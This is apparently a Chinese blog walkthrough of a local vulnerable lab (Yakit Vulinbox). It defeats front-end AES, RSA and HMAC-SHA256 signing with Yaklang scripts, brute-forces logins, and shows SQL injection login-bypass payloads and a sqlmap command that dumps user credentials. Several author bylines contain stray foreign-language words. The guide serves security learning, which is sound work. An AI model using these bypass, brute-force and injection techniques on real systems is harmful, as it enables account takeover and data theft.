
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/CVE-Lemon/p/18622394" title="发布于 2024-12-23 08:19">
    <span role="heading" aria-level="2">Yakit靶场-高级前端加解密与验签实战-全关卡通关教程</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222184725471-1289156308.png" alt="Yakit靶场-高级前端加解密与验签实战-全关卡通关教程" class="desc_img">
        Yakit靶场-高级前端加解密与验签实战-全关卡通关教程，包括AES、RSA、SHA256等算法。
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="一前端验签-sha256">一、前端验签-SHA256</h1>
<p>本文作者为CVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="绕过">绕过</h2>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005130112-183765002.png" alt="" loading="lazy"></p>
<p>通过查看源代码可以看到key为</p>
<pre><code>1234123412341234
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005133198-1662357300.png" alt="" loading="lazy"></p>
<p>通过查看源代码可以看到是通过SHA256来进行签名的，他把请求体的username和password字段提取，然后进行加密。</p>
<pre><code>username=admin&amp;password=admin123
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005136827-1401035207.png" alt="" loading="lazy"></p>
<p>使用CyberChef加密，最终得到加密值为：<code>fc4b936199576dd7671db23b71100b739026ca9dcb3ae78660c4ba3445d0654d</code></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005139852-723382500.png" alt="" loading="lazy"></p>
<p>可以看到自己计算和前端计算的一致：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005143563-741888526.png" alt="" loading="lazy"></p>
<p>修改密码，重新构造签名：</p>
<pre><code>username=admin&amp;password=666666
=&gt;
26976ad249c29595c3e9e368d9c3bc772b5a27291515caddd023d69421b7ffee
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005148499-2079865334.png" alt="" loading="lazy"></p>
<p>发送请求，可以看到验签成功，密码正确登陆成功，自此签名绕过成功。</p>
<pre><code class="language-http">POST /crypto/sign/hmac/sha256/verify HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{
  "signature": "26976ad249c29595c3e9e368d9c3bc772b5a27291515caddd023d69421b7ffee",
  "key": "31323334313233343132333431323334",
  "username": "admin",
  "password": "666666"
}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005152327-1303090435.png" alt="" loading="lazy"></p>
<h2 id="热加载">热加载</h2>
<p>这是我写的热加载代码，通过<code>beforeRequest</code>劫持请求包，使用<code>encryptData</code>函数进行加密，最终实现热加载自动签名功能。</p>
<pre><code class="language-yaklang">encryptData = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)
    params = json.loads(body)
    //获取账号和密码
    name = params.username
    pass  = params.password
    key = "31323334313233343132333431323334"    //十六进制密钥

    //HmacSha256加密
    signText = f`username=${name}&amp;password=${pass}`
    sign = codec.EncodeToHex(codec.HmacSha256(f`${codec.DecodeHex(key)~}`, signText))

    //构造请求体
    result = f`{"username":"${name}","password":"${pass}","signature":"${sign}","key":"${key}"}`

    return string(poc.ReplaceBody(packet, result, false))
}

//发送到服务端修改数据包
// beforeRequest = func(req){
//     return encryptData(req)
// }

//调试用
packet = &lt;&lt;&lt;TEXT
POST /crypto/sign/hmac/sha256/verify HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json
Content-Length: 179

{"username":"admin","password":"admin123"}
TEXT
result = (encryptData(packet))
print(result)
</code></pre>
<p>调试结果如下：<br>
<img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005207512-1712536217.png" alt="" loading="lazy"></p>
<p>把<code>beforeRequest</code>取消注释，添加到Web Fuzzer模块的热加载中：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005209904-617821989.png" alt="" loading="lazy"></p>
<p>保存后发送请求，热加载成功实现自动签名功能。<br>
<img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005212881-1707760919.png" alt="" loading="lazy"><br>
<img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005215343-226820087.png" alt="" loading="lazy"></p>
<h1 id="二前端验签-sha256rsa">二、前端验签-SHA256+RSA</h1>
<p>本文作者ärCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="绕过-1">绕过</h2>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163838215-1435589105.png" alt="" loading="lazy"></p>
<p>根据提示可以看出这次签名用了SHA2556和RSA两个技术进行加密。</p>
<p>查看源代码可以看到RSA公钥是通过请求服务器获取：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163846159-62114613.png" alt="" loading="lazy"></p>
<p>请求一下：<a href="http://127.0.0.1:8787/crypto/js/rsa/public/key" target="_blank" rel="noopener nofollow">http://127.0.0.1:8787/crypto/js/rsa/public/key</a> ，可以看到公钥。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163849146-42003262.png" alt="" loading="lazy"></p>
<p>SHA256密钥位置：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163851382-1783910293.png" alt="" loading="lazy"></p>
<p><code>Encrypt</code>方法:</p>
<pre><code class="language-javascript">function Encrypt(word) {
    console.info(word);
    return  KEYUTIL.getKey(pubkey).encrypt(CryptoJS.HmacSHA256(word, key.toString(CryptoJS.enc.Utf8)).toString()); 
}
</code></pre>
<p><code>KEYUTIL.getKey(pubkey).encrypt</code>是RSA1v15加密方法，在代码中可以看到先进行SHA265加密，然后再RSA加密。被加密的文本的格式同<a href="https://www.cnblogs.com/CVE-Lemon/p/18606207" target="_blank">上一关</a>所示。</p>
<p>使用CyberChef加密：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163855031-1339830580.png" alt="" loading="lazy"></p>
<p>替换请求，可以看到签名构造成功：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163900615-1288094296.png" alt="" loading="lazy"></p>
<h2 id="热加载-1">热加载</h2>
<p>这是我写的Yakit热加载代码，通过<code>beforeRequest</code>劫持请求包，使用<code>encryptData</code>函数进行加密，<code>getPubkey</code>获取公钥，最终实现热加载自动签名功能。</p>
<pre><code class="language-yaklang">getPubkey = func() {
    //通过请求动态获取公钥
    rsp, req = poc.HTTP(`GET /crypto/js/rsa/public/key HTTP/1.1
Host: 127.0.0.1:8787

    `)~
    body = poc.GetHTTPPacketBody(rsp) // 响应体
    return body
}

encryptData = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)
    params = json.loads(body)
    name = params.username
    pass = params.password
    key = "31323334313233343132333431323334"
    pemBytes = getPubkey() // 获取公钥

    signText = f`username=${name}&amp;password=${pass}`
    sha256sign = codec.EncodeToHex(codec.HmacSha256(f`${codec.DecodeHex(key)~}`, signText)) // SHA256加密
    rsaSign = codec.EncodeToHex(codec.RSAEncryptWithPKCS1v15(pemBytes /*type: []byte*/, sha256sign)~) // RSA加密

    body = f`{"username":"${name}","password":"${pass}","signature":"${rsaSign}","key":"${key}"}`
    return string(poc.ReplaceBody(packet, body, false))
}


//发送到服务端修改数据包
// beforeRequest = func(req){
//     return encryptData(req)
// }

//调试用
packet = &lt;&lt;&lt;TEXT
POST /crypto/sign/hmac/sha256/verify HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json
Content-Length: 179

{"username":"admin","password":"password"}
TEXT
result = (encryptData(packet))
print(result)
</code></pre>
<p>这次不调试了，直接请求看看效果，成功热加载自动签名：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163907213-28594452.png" alt="" loading="lazy"></p>
<p>插入临时字典爆破，可以看到正确密码为admin123。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214163909457-1522571399.png" alt="" loading="lazy"></p>
<h1 id="三cryptojsaescbc-前端加密登陆表单">三、CryptoJS.AES(CBC) 前端加密登陆表单</h1>
<p>本文作者isCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="分析">分析</h2>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014336824-2051997129.png" alt="" loading="lazy"></p>
<p>查看源代码，可以看到加密方式为AES，查询网上资料得知，此encrypt方法默认为CBC模式。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014338787-608965049.png" alt="" loading="lazy"></p>
<p>key为：<code>1234123412341234</code></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014341166-1037827622.png" alt="" loading="lazy"></p>
<p>iv为随机生成的：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014343585-751910180.png" alt="" loading="lazy"></p>
<p>将用户名和密码以json的格式进行AES加密</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014345953-75173403.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014349031-301610679.png" alt="" loading="lazy"></p>
<p>使用CyberChef加密</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014351862-2105453092.png" alt="" loading="lazy"></p>
<p>替换请求data内容，验证成功。</p>
<pre><code class="language-http">POST /crypto/js/lib/aes/cbc/handler HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json
Content-Length: 169

{
  "data": "2/eylw258wQNJQznPd5zr7xpNWzPR3vcgCmY3zwuTdW0WjSwbNzAhTraiebLdPRK",
  "key": "31323334313233343132333431323334",
  "iv": "67ba30beaabf8ccfebeca655d487805a"
}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014355830-557569038.png" alt="" loading="lazy"></p>
<h2 id="热加载-2">热加载</h2>
<p>这是本人写的Yakit热加载代码，通过<code>beforeRequest</code>劫持请求包，使用<code>encryptData</code>函数进行加密，最终实现热加载自动加密功能。</p>
<pre><code class="language-yaklang">encryptData = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)

    hexKey = "31323334313233343132333431323334"
    hexIV = "67ba30beaabf8ccfebeca655d487805a"
    key = codec.DecodeHex(hexKey)~
    iv = codec.DecodeHex(hexIV)~

    data = codec.AESCBCEncrypt(key /*type: []byte*/, body, iv /*type: []byte*/)~
    data = codec.EncodeBase64(data)

    body = f`{"data": "${data}","key": "${hexKey}","iv": "${hexIV}"}`
    return string(poc.ReplaceBody(packet, body, false))
}

//发送到服务端修改数据包
beforeRequest = func(req){
    return encryptData(req)
}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014359762-1854724716.png" alt="" loading="lazy"></p>
<p>效果：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014406498-1138827595.png" alt="" loading="lazy"></p>
<h1 id="四cryptojsaesecb-前端加密登陆表单">四、CryptoJS.AES(ECB) 前端加密登陆表单</h1>
<p>本文作者はCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="分析-1">分析</h2>
<p>模式变为AES的ECB模式，其他的与CBC模式基本一样。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014413034-122924669.png" alt="" loading="lazy"></p>
<pre><code>zqBATwKGlf9ObCg8Deimijp+OH1VePy6KkhV1Z4xjiDwOuboF7GPuQBCJKx6o9c7
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014414823-1198823420.png" alt="" loading="lazy"></p>
<h2 id="热加载-3">热加载</h2>
<p>功能跟上面大致一样。ECB模式不需要iv，修改成ECB加密，然后删除掉iv相关代码即可。</p>
<pre><code class="language-yaklang">encryptData = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)

    hexKey = "31323334313233343132333431323334"
    key = codec.DecodeHex(hexKey)~

    //ECB模式加密
    data = codec.AESECBEncrypt(key /*type: []byte*/, body, nil /*type: []byte*/)~
    data = codec.EncodeBase64(data)

    body = f`{"data": "${data}","key": "${hexKey}"}`
    return string(poc.ReplaceBody(packet, body, false))
}

//发送到服务端修改数据包
// beforeRequest = func(req){
//     return encryptData(req)
// }

//调试用
packet = &lt;&lt;&lt;TEXT
POST /crypto/js/lib/aes/cbc/handler HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json
Content-Length: 179

{"username":"admin","password":"admin123"}
TEXT
result = (encryptData(packet))
print(result)
</code></pre>
<p>成功加密</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215014423335-1737486920.png" alt="" loading="lazy"></p>
<h1 id="五cryptojsaesecb-被前端加密的-sql-注入">五、CryptoJS.AES(ECB) 被前端加密的 SQL 注入</h1>
<p>本文作者éCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215175913795-429899534.png" alt="" loading="lazy"></p>
<h2 id="绕过-2">绕过</h2>
<h3 id="sql注入">SQL注入</h3>
<p>前端代码和<a href="https://www.cnblogs.com/CVE-Lemon/p/18607483" target="_blank">上一关</a>一样，都是通过AES加密请求的数据。</p>
<p>在<code>yaklang\common\vulinbox\db.go</code>中可以看到相关后端代码：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215175923982-1856603737.png" alt="" loading="lazy"></p>
<p>数据库是SQLite类型，username参数是直接拼接查询的，所以存在SQL注入漏洞。</p>
<h3 id="登录绕过">登录绕过</h3>
<p><code>yaklang\common\vulinbox\vul_cryptojs_base.go</code>：</p>
<p>密码在第87行被赋值，密码是通过上面的<code>GetUserByUsernameUnsafe</code>获取的</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215175927595-1964547788.png" alt="" loading="lazy"></p>
<p>输入<code>{"username":"admin","password":"666666"}</code>的SQL语句</p>
<pre><code class="language-sql">select * from vulin_users where username = 'admin';
</code></pre>
<p>输入<code>{"username":"admin'or 1=1--","password":"666666"}</code>的SQL语句</p>
<pre><code class="language-SQL">select * from vulin_users where username = 'admin'or 1=1--';
</code></pre>
<p>相当于：</p>
<pre><code>select * from vulin_users where true;
</code></pre>
<p>所以返回结果为表中的所有数据。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215175931792-1491749135.png" alt="" loading="lazy"></p>
<p>所以用户名随便输，密码输入表中存在的随意一个密码就能登陆成功：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215175937536-142050855.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215175940650-405737241.png" alt="" loading="lazy"></p>
<h2 id="sqlmap">sqlmap</h2>
<p>使用Yakit的MITM 交互式劫持，热加载写上AES加密的代码</p>
<pre><code class="language-yaklang">encryptData = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)
    hexKey = "31323334313233343132333431323334"
    key = codec.DecodeHex(hexKey)~
    data = codec.AESECBEncrypt(key /*type: []byte*/, body, nil /*type: []byte*/)~
    data = codec.EncodeBase64(data)
    body = f`{"data": "${data}","key": "${hexKey}"}`
    return string(poc.ReplaceBody(packet, body, false))
}
beforeRequest = func(req){
    return encryptData(req)
}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215175943826-1077978461.png" alt="" loading="lazy"></p>
<p>1.txt</p>
<pre><code class="language-http">POST /crypto/js/lib/aes/ecb/handler/sqli HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{"username":"admin","password":"admin"}
</code></pre>
<p>运行sqlmap</p>
<pre><code>python .\sqlmap.py -r .\1.txt --proxy=http://127.0.0.1:8081 --batch -T vulin_users  -C username,password,role --dump
</code></pre>
<p>注入成功</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215180051391-886033708.png" alt="" loading="lazy"></p>
<h1 id="六cryptojsaesecb-被前端加密的-sql-注入bypass认证">六、CryptoJS.AES(ECB) 被前端加密的 SQL 注入(Bypass认证)</h1>
<p>本文作者esCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="绕过-3">绕过</h2>
<p>这个前端代码与前面的还是一样的，都是AES ECB加密。</p>
<p>后端代码如下，可以看到查询语句在109行，用户名和密码都是直接拼接查询的。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215180054777-592474924.png" alt="" loading="lazy"></p>
<p>SQL注入跟上面的操作一样，这里就不演示了，这里直接用热加载绕过登录。</p>
<pre><code class="language-http">POST /crypto/js/lib/aes/ecb/handler/sqli/bypass HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{"username":"admin'or 1=1--","password":""}
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241215180058861-109827621.png" alt="" loading="lazy"></p>
<h1 id="七aes-ecb-加密表单附密码">七、AES-ECB 加密表单（附密码）</h1>
<p>同 CryptoJS.AES(ECB) 前端加密登陆表单。</p>
<h1 id="八rsa加密表单附密钥">八、RSA：加密表单，附密钥</h1>
<p>本文作者istCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="分析-2">分析</h2>
<p><code>generateKey</code>函数用来生成随机的RSA公私钥</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010049667-1705240026.png" alt="" loading="lazy"></p>
<p>加密的格式如下：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010052529-1020380982.png" alt="" loading="lazy"></p>
<pre><code class="language-json">{"username":"admin","password":"123456","age":"20"}
</code></pre>
<p>对数据进行RSA加密，请求包格式：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010054984-721120106.png" alt="" loading="lazy"></p>
<h2 id="热加载-4">热加载</h2>
<p>这是本人写的Yakit热加载代码，通过<code>beforeRequest</code> hook请求包，调用<code>encrypt</code>函数进行加密，最终实现热加载自动加密功能。由于密钥是从前端获取，所以直在在热加载里生成了。</p>
<pre><code>encrypt = (packet) =&gt; {
    //生成RSA密钥
    publicKey, privateKey = tls.GenerateRSA2048KeyPair()~
    //base64编码
    publicKeyBase64 = codec.EncodeBase64(publicKey)
    privateKeyBase64 = codec.EncodeBase64(privateKey)

    body = poc.GetHTTPPacketBody(packet)
    data = codec.RSAEncryptWithOAEP(publicKey /*type: []byte*/, body)~ // RSA加密
    data = codec.EncodeBase64(data)
    
    //处理换行符
    publicKey = str.ReplaceAll(publicKey, "\n", r"\n")
    privateKey = str.ReplaceAll(privateKey, "\n", r"\n")

  	 //构造请求体
    body = f`{"data":"${data}","publicKey":"${publicKey}","publicKeyBase64":"${publicKeyBase64}","privateKey":"${privateKey}","privateKeyBase64":"${privateKeyBase64}"}`
    
    return string(poc.ReplaceBody(packet, body, false))
}

//发送到服务端修改数据包
beforeRequest = func(req){
    return encrypt(req)
}
</code></pre>
<p>效果：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010101188-1227316557.png" alt="" loading="lazy"></p>
<p>使用字典爆破，爆破成功，可以看到密码为admin123。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010103429-330178807.png" alt="" loading="lazy"></p>
<h1 id="九rsa加密表单服务器传输密钥">九、RSA：加密表单服务器传输密钥</h1>
<p>本文作者हैCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="分析-3">分析</h2>
<p>这里的代码跟上一关的类似，但是加密的公钥是通过请求服务端获取的</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010258053-109528556.png" alt="" loading="lazy"></p>
<p><a href="http://127.0.0.1:8787/crypto/js/rsa/generator" target="_blank" rel="noopener nofollow">http://127.0.0.1:8787/crypto/js/rsa/generator</a></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010259747-2012372105.png" alt="" loading="lazy"></p>
<p>由于密钥是服务端生产的，服务端有公私钥信息，所以自然不需要传递公私钥了。</p>
<p>请求格式如下，只有被加密的内容：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010302779-1560805770.png" alt="" loading="lazy"></p>
<h2 id="序列热加载">序列+热加载</h2>
<h3 id="序列">序列</h3>
<p>打开Yakit的Web Fuzzer，点击左侧的序列<br>
<img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010305869-1197929681.png" alt="" loading="lazy"></p>
<p>选择从服务端获取密钥的那个数据包</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010311350-2063766194.png" alt="" loading="lazy"></p>
<p>使用数据提取器提取公钥</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010313496-2019350956.png" alt="" loading="lazy"></p>
<p>提取结果正常：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010316874-1542100205.png" alt="" loading="lazy"></p>
<p>再添加序列：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010322386-96102009.png" alt="" loading="lazy"></p>
<p>先把请求体置空，编写热加载代码</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010324143-1704373230.png" alt="" loading="lazy"></p>
<h3 id="热加载-5">热加载</h3>
<p>本来之前写的是请求体格式跟上一关一样，然后在热加载里请求来获取密钥，缺点也显而易见，每次登录请求都会多出了一个请求公钥的数据包，所以最后选择用Yakit的序列配合热加载标签传参来加密。</p>
<p>由于Yakit热加载标签只能传一个参数，这里感谢Yakit群群友<strong>Gun</strong>的帮助，给了我一个手动分割参数的函数。</p>
<p>把序列第一个请求提取到的<code>publicKey</code>变量和需要加密的数据传过去，由<code>splitParams</code>分割，然后传参给<code>encrypt</code>进行RSA加密。</p>
<p>序列格式：</p>
<pre><code class="language-fuzztag">{{yak(splitParams|{{p(publicKey)}}|{"username":"admin","password":"admin123","age":"20"})}}
</code></pre>
<p>热加载代码：</p>
<pre><code class="language-yaklang">encrypt = (pemPublic, data) =&gt; {
    data = codec.RSAEncryptWithOAEP(pemPublic /*type: []byte*/, data)~
    data = codec.EncodeBase64(data)
    body = f`{"data":"${data}"}`
    return body
}

//分割传过来的参数，每个参数中间以|分隔
splitParams = (params) =&gt; {
    pairs := params.SplitN("|", 2)
    return encrypt(pairs[0], pairs[1])
}
</code></pre>
<p>执行序列，爆破成功，使用序列的好处就是只获取一次公钥即可。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241221010331508-873300056.png" alt="" loading="lazy"></p>
<h3 id="之前的代码">之前的代码：</h3>
<p>弃用代码，就不做解释了。</p>
<pre><code class="language-yaklang">getPubkey = func(host) {
    //通过请求动态获取公钥
    rsp, req = poc.HTTP(f`GET /crypto/js/rsa/generator HTTP/1.1
Host: ${host}

    `)~
    body = poc.GetHTTPPacketBody(rsp) // 响应体
    params = json.loads(body)
    publicKey = str.ReplaceAll(params.publicKey, r"\n", "\n")
    println(publicKey)
    return publicKey
}

encryptData = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet)
    host = poc.GetHTTPPacketHeader(packet, "Host")
    pemBytes = getPubkey(host) // 获取公钥
    println(pemBytes)

    data = codec.RSAEncryptWithOAEP(pemBytes /*type: []byte*/, body)~
    data = codec.EncodeBase64(data)

    body = f`{"data":"${data}"}`
    return string(poc.ReplaceBody(packet, body, false))
}


//发送到服务端修改数据包
// beforeRequest = func(req){
//     return encryptData(req)
// }

//调试用
packet = &lt;&lt;&lt;TEXT
POST /crypto/js/rsa/fromserver HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json
Content-Length: 179

{"username":"admin","password":"123456","age":"20"}
TEXT
result = (encryptData(packet))
print(result)
</code></pre>
<h1 id="十rsa加密表单服务器传输密钥响应加密">十、RSA：加密表单服务器传输密钥+响应加密</h1>
<p>本文作者естьCVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h2 id="分析-4">分析</h2>
<p>这里的公私钥同上一关一样是通过服务端获取</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020204062-1925722964.png" alt="" loading="lazy"></p>
<p>通过查看响应包可以看到，data字段被加密了，当然这里我已经知道了data字段和origin字段的内容是一样的，下面来看看该如何编写热加载代码吧。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020400964-337586214.png" alt="" loading="lazy"></p>
<h2 id="序列热加载-1">序列+热加载</h2>
<h3 id="方法1固定私钥">方法1（固定私钥）</h3>
<p>这里跟上一关一样选择Web Fuzzer的序列功能。</p>
<p>数据提取器提取公私钥</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020237098-1801444794.png" alt="" loading="lazy"></p>
<p>由于<code>afterRequest</code>函数无法获取到参数，所以在代码里写死了私钥内容来解密响应包。</p>
<p>热加载代码：</p>
<pre><code class="language-yaklang">var PRIVATE_KEY = `这里填私钥内容（可换行）`

decryptData = (packet) =&gt; {
    body = poc.GetHTTPPacketBody(packet) // 获取响应包体
    jsonBody = json.loads(body) // 转为map格式

    //解密数据
    data = codec.DecodeBase64(json.loads(body).data)~
    data = codec.RSADecryptWithOAEP(PRIVATE_KEY/*type: bytes*/, data/*type: any*/)~
    data = string(data)

    // 使用JsonPath定位，替换json中的data
    body = json.ReplaceAll(jsonBody, "$..data", data)
    // 转为json格式
    body = json.dumps(body, json.withIndent("   "))
    // 替换正则匹配结果（可省略）
    pattern := `\\`
    body = re.ReplaceAll(body, pattern, "")

    return poc.ReplaceBody(packet, body/*type: bytes*/, false/*type: bool*/)
}

encryptData = (pemPublic, data) =&gt; {
    data = codec.RSAEncryptWithOAEP(pemPublic /*type: []byte*/, data)~
    data = codec.EncodeBase64(data)
    body = f`{"data":"${data}"}`
    return body
}

//分割参数的函数
splitParams = (params) =&gt; {
    pairs := params.SplitN("|", 2)
    return encryptData(pairs[0], pairs[1])
}

// 修改响应包
afterRequest = func(rsp){
    return decryptData(rsp)
}
</code></pre>
<p>请求格式：</p>
<pre><code class="language-http">POST /crypto/js/rsa/fromserver/response HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{{yak(splitParams|{{p(publicKey)}}|{"username":"admin","password":"admin23","age":"20"})}}
</code></pre>
<p>下图为效果图，响应包的data字段的值被解密后的数据替换。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241222020250114-1678280096.png" alt="" loading="lazy"></p>
<h3 id="方法2使用mirrorhttpflow">方法2（使用mirrorHTTPFlow）</h3>
<p>在这一关（响应加密）和下一关（RSA加密AES密钥）解密过程中，我一直都在寻找如何才能把数据提取器提取到的<code>privateKey</code>传参到<code>beforeRequest</code>和<code>afterRequest</code>这类函数中，以达到修改数据包的目的。</p>
